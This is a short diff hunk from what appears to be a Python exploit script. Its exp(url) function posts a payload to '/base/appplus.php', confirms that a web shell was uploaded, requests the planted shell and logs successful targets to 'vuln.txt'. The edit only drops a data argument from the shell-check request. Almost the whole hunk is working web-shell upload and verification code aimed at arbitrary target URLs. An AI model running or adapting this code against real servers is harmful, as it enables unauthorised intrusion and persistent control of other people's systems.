@@ -41,7 +41,7 @@ def exp(url):
             req2 = requests.post(url + "/base/appplus.php", headers=header, verify=False, data=payload, timeout=25)
             if req2.status_code == 200 and shell_name in req2.text:
                 shell = url + "/" + shell_path + "/" + shell_name
-                req3 = requests.get(shell, headers=header, verify=False, data="act=appcode", timeout=25)
+                req3 = requests.get(shell, headers=header, verify=False, timeout=25)
                 if req3.status_code == 200 and "404 Not Found." in req3.text:
                     print(wirte_targets(shell, "vuln.txt"))
     except:
